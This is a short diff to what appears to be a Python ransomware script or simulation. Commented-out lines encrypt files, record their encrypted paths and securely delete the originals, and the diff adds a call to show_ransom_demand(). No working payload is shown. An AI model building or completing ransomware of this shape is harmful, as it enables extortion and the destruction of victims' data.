@@ -65,3 +65,5 @@ if __name__ == '__main__':
                     #     f.write(ciphertext)
                     # encrypted_files[file_path] = encrypted_file_path
                     # secure_delete(file_path)
+
+    show_ransom_demand()
